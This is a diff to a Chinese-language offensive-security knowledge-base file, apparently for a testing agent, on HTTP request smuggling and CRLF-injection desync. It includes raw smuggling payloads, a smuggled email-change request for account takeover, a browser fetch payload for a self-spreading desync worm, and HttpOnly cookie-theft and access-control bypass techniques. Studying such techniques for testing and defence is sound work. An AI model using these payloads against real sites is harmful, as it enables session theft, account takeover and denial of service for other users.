@@ -1,6 +1,6 @@
 # HTTP 请求走私专题
 
-> CL.TE/TE.CL/TE.TE 字节级、H2 变体、CL.0/Fat GET/客户端反同步、缓存投毒链、CDN 行为矩阵。
+> CL.TE/TE.CL/TE.TE 字节级、H2 变体、CL.0/Fat GET/客户端反同步、缓存投毒链、CDN 行为矩阵、头注入驱动 desync（RQP/浏览器驱动/dangling-byte）、新触发器族。
 > 基础速查见 web-vulnerabilities.md §6.1；缓存投毒详见 `$AGENT_DIR/knowledge-base/cache-poisoning.md`。
 
 ---
@@ -101,8 +101,8 @@ HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
 Connection: Upgrade, HTTP2-Settings
 ```
 
-代理脆弱性（BishopFox 2020 分类 + 2026-08 核验修正，**版本敏感用前实测**）：
-- HAProxy **≥2.9.11/≥3.0.5 已修复**默认转发 h2c upgrade token（commit 7b89aa5b19）；旧版默认可利用
+代理脆弱性（**版本敏感用前实测**）：
+- HAProxy **≥2.9.11/≥3.0.5 已修复**默认转发 h2c upgrade token；旧版默认可利用
 - Traefik：Go stdlib 反代剥离 `HTTP2-Settings` 头 → 攻击对多数 h2c 后端失败（维护方立场不受影响）
 - Nuster 曾默认转发；AWS ALB/CLB、Nginx、Apache、Squid、Varnish、Kong、Envoy、ATS 需错误配置
 - **不能按产品名直接判定可利用，必须实测**
@@ -146,3 +146,99 @@ outer = "GET /cached-page HTTP/1.1\r\nContent-Length: {len(inner)}\r\n\r\n" + in
 **DoS**：Rapid Reset（CVE-2023-44487）= HEADERS 开流→RST_STREAM 立即取消，高频循环，客户端成本远低于服务端处理成本；PRIORITY `exclusive=true + weight=256` 饿死他人流。缓解识别：SETTINGS_MAX_CONCURRENT_STREAMS 限制、RST 速率限制。
 
 **Server Push 投毒**：push /static/app.js + 恶意内容 → 缓存到合法 URL（多数现代浏览器已禁用 push，旧环境适用）。
+
+## 10. 头注入驱动的 Desync（CRLF-Powered）
+
+> 把"HTTP 头注入"（传统评级=开放重定向/XSS 级）升级为完整 desync/RQP 的路径。核心认知: **头注入不是低危 bug**。
+
+### 10.1 注入源与检测
+
+**注入源**:
+- Nginx `proxy_pass http://backend$uri;`——`$uri` 是**已 URL 解码+规范化**的路径，路径里的 `%0d%0a` 解码成真实 CRLF 转发上游。`return 302 https://example.com$uri;` 同理（响应头注入）。OpenResty/Tengine 基于 Nginx 同样检查
+- 自定义上游头: 注入落点在上游请求的自定义头（如 `X-Original-Url`）而非路径
+- **非路径插入点**: Cookie 值、session 参数（如 `Cookie: sess=abc<注入>` 经 `POST /graphql/v1/abc` 拼回上游路径）——比路径注入更冷门、WAF 覆盖更弱
+
+**检测原语**（注入后看可预测状态码）:
+```
+GET /%20HTTP/13.37%0d%0aFoo:%20bar HTTP/1.1   → 505 Version Not Supported（注入进请求行）
+GET /%20HTTP/1.1%0d%0aTransfer-Encoding:%20x%0d%0aX:%20x HTTP/1.1 → 501（注入进 TE 头）
+GET /%20HTTP/1.1%0d%0aExpect:%20asdf%0d%0aX:%20x HTTP/1.1 → 417 Expectation Failed（Expect 头）
+```
+
+### 10.2 请求拆分 → 响应队列投毒（RQP）
+
+注入 **两个连续 CRLF**（空行）拆出完整第二请求——不违反 RFC 的变形头，兼容性好:
+```
+GET /<urlencoded: HTTP/1.1
+Host: example.com
+Connection: keep-alive
+
+TRACE / HTTP/1.1
+X: x> HTTP/1.1
+Host: example.com
+```
+上游收到 2 个完整请求 → 响应队列错位 → 持续收割其他用户响应（DoS 其余人）。CDN 内部 desync 时改 Host 可路由到同 CDN 任意域；配持久存储 gadget + 前缀攻击可存储他人请求（含 session/auth 头）。
+
+### 10.3 单头 CL.TE（无法用双 CRLF 时）
+
+部分目标拒绝双 CRLF 并断连，但单头注入可行——注入 `Transfer-Encoding: chunked` 头构造经典 CL.TE:
+```
+POST /<urlencoded: HTTP/1.1
+Transfer-Encoding: chunked
+Foo: bar> HTTP/1.1
+Host: clothes.shop
+Content-Length: 66
+
+0
+
+POST /user/update?email=attacker@atk.cc HTTP/1.1
+Cookie: SESSID=attacker
+X: x
+```
+超时技术确认（外层声明 CL、注入 TE，后端等 chunked 结尾 → TIMEOUT）。**避坑**: 走私 update/profile 类端点时，响应若反射攻击者 cookie（Set-Cookie），会把全体在线用户登进攻击者账户——优先走私改 email/密码字段而非会话回显操作。
+
+### 10.4 浏览器驱动（connection-locked / IP-locked 的破局）
+
+fetch/导航可直接触发本类 desync（URL 编码的 CRLF 在请求行内）——把攻击搬进受害者浏览器，绕过"IP 锁定/连接锁定不可跨用户"限制，并可借 XSS gadget 形成**自复制 desync 蠕虫**:
+```javascript
+fetch("https://example.com/%20HTTP/1.1%0d%0aHost:%20example.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar")
+```
+- **connection-locked 0.CL**: `window.open(stage1)` + `setTimeout(()=>{w.close(); location=stage2}, 500)` 让两请求落同一连接（先 CL 污染、再 HEAD 技术）
+- **IP-locked + RQP**: 每 10ms 建 hidden iframe + 3s 后销毁（防浏览器崩溃），"Loading your profile" 页面骗用户停留 ~10s
+- **偷 HttpOnly cookie**: XSS 无用时，HEAD 技术拿 XSS + 堆叠第三个含 `Set-Cookie: Session=victim; HttpOnly` 的响应进 body → XSS 读 DOM 即得 session token
+
+### 10.5 隧道与防护绕过
+
+- **盲隧道修复——Expect: 100-continue**: Nginx 收到未预期的 100 响应时视为无 CL 响应持续读到连接关闭 → 走私响应回显。可绕前端访问控制（`/robots.txt` 路径 + 隧道 `GET /config`）
+- **HEAD + Range**: Range 响应自动调整 CL——任意长响应都能当 HEAD gadget（`Range: bytes=1-650` 裁剪出 XSS payload 长度）；缺闭合标签时再堆一个请求用 Range 只取 `</script>` 补齐
+- **响应头剥除绕过**: 注入 `Expect: 100-continue` 使前端忘记剥敏感响应头（内网 IP/origin 泄露）
+- **CDN-Cache-Control 响应头注入**: `CDN-Cache-Control: private="Location"` 让 Cloudflare 剥 Location 头 → 302 响应突破 Location 语法限制落地 XSS（payload 直接进 body）
+- **Reverse desync**（响应头注入侧）: 响应里注入短 CL + 完整第二响应 → 客户端读错位。通常死于 stacked-response 问题（浏览器过读即断连），暂无通用绕过
+
+### 10.6 新触发器族
+
+| 触发器 | 形态 | 说明 |
+|---|---|---|
+| `Content-Type: multipart/byteranges` | `POST / + CL + Content-Type: multipart/byteranges; boundary=B` | CL.0 型，多实现中招（单批 200+ 站点，含银行）; 概念源=RFC 里 byteranges 仅用于响应的规则被请求侧共享解析 |
+| `Transfer-Encoding: gzip` + HTTP/1.0 | `GET / HTTP/1.0 + TE: gzip + CL` | RFC 9112 §6.1 要求 HTTP/1.0 带 TE 按错误帧处理 → CL.0 desync（F5 Big-IP 等确认） |
+| `Early-Data: 1` | 头 `Early-Data: experimental` | TLS 0-RTT 语义头被非预期处理 |
+| `CONNECT / HTTP/1.1` | 经前端转发 CONNECT 的部署 | 2xx 后隧道化忽略 CL/TE → 字节错位（Beyond Trust 产品系） |
+| 重复 CL（同值） | `Content-Length: 28\r\nContent-Length: 28` | 部分服务器见双 CL 按 0 处理 → 走私窗口 |
+| `Expect: \t100-continue` | TAB 变体 | 绕 Expect 头规范化 |
+
+### 10.7 RQP 增强与探测原语
+
+- **dangling-byte 技术**: 走私请求声明 `Content-Length: 1` 但差 1 字节不发 → 第二响应在受害者请求到达后才生成 → 彻底消除 stacked-response 竞态（对方法无关后端全有效）。stacked-response 问题=后端发出两个响应时前端/浏览器读到多于 CL 承诺的数据→丢弃并断连，破坏 RQP 的竞态窗口:
+```
+POST / + 触发器 + CL:123
+POST /smuggled HTTP/1.1
+Host: example.com
+Content-Length: 1          ← 少 1 字节
+```
+- **protocol ruler**: 用后端头长度上限当前尺测前端变换——`A: c0 8a A…{64030}` 命中限值而 `{64031}` 报 400，比对限值位移量即知前端把 2 字节序列展开成几字节。可发现 IP 伪造头改写/头丢弃/Unicode mojibake 变换（这些变换可导向 desync）
+- **clean request 探测纪律**: "干净"（RFC 无歧义单请求）却收到两个响应 = 高价值信号——脏请求的双响应可能只是正常解析分歧
+- **异常检测层**: 文本/二进制混杂响应（内存泄漏）、body 内嵌 `<HTML`/行内 HTTP 头（inline header 错位）、HTTP/0.9 响应——desync 扫描器应标记而非丢弃
+- **Range 缓存投毒**: 部分 Range 响应不带 206 状态码 → 可能被缓存按完整响应存储; `Range: bytes=364-382, 1-2` 多段 + multipart/mixed 重组/上下文逃逸可注入（详见 cache-poisoning.md）
+- **Shared-Parser Confusion（概念）**: 服务器共享代码解析请求与响应 → 响应处理特性可被请求触发（如请求里的 Set-Cookie 被处理）。任何"响应专用"头/语法（Content-Location、multipart/byteranges、206）都值得塞进请求测试
+
+**工具**: `github.com/t0xodile/crlf-powered-desync-scanner`（Burp 扩展）、`github.com/turtlesec-software/crlf-desyncs`（nuclei 模板）。
